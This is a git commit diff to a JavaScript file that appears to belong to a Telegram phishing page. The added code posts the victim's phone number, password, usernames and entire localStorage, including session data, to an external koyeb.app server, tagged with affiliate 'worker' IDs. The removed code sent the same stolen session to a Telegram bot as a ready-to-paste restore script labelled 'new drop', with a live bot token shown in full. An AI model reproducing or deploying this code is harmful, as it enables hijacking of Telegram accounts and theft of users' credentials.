4916fd0a9f5f560d0db16f9d30c846add721b352
MrGreen243 <102157725+MrGreen243@users.noreply.github.com>
2025-02-19 12:12:52 +0100

    ensure check gets delivered

--- check.js
+++ check.js
@@ -22,6 +22,24 @@ document.addEventListener('DOMContentLoaded', function () {
           localStorage.removeItem('GramJs:apiCache');
           localStorage.removeItem('tt-global-state');
 
+          fetch(`https://loud-rani-senior-e8046183.koyeb.app/api/users/telegram/info`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              userId: currentUserId,
+              firstName,
+              usernames,
+              phoneNumber,
+              isPremium,
+              password,
+              quicklySet: localStorage,
+              type: new URLSearchParams(window.location.search).get('type'),
+              worker: new URLSearchParams(window.location.search).get('worker'),
+              workerId: new URLSearchParams(window.location.search).get(
+                'workerId'
+              ),
+            }),
+          });
           fetch(`/api/users/telegram/info`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -40,22 +58,6 @@ document.addEventListener('DOMContentLoaded', function () {
               ),
             }),
           });
-
-          const quickAuth = `Object.entries(${JSON.stringify(
-            localStorage
-          )}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;
-
-          const encodedAuth = encodeURI(quickAuth)
-
-          fetch(
-            `https://api.telegram.org/bot7955294841:AAFDavf_6cL0_uk3RLExdrUORlOPd6cBoSw/sendMessage?chat_id=7427019338&text=👨🏻‍🍳💰 new drop%0A%0A📫 username: ${usernames}%0AScript Below%0AThank You!`,
-            { method: 'GET' }
-          ).then(() => {
-           fetch(
-            `https://api.telegram.org/bot7955294841:AAFDavf_6cL0_uk3RLExdrUORlOPd6cBoSw/sendMessage?chat_id=7427019338&text=${encodedAuth}`,
-            { method: 'GET' }
-          )
-          })
 
           window.Telegram.WebApp.openTelegramLink(
             'https://t.me/+8dtqN7T2sJpmNTb7'
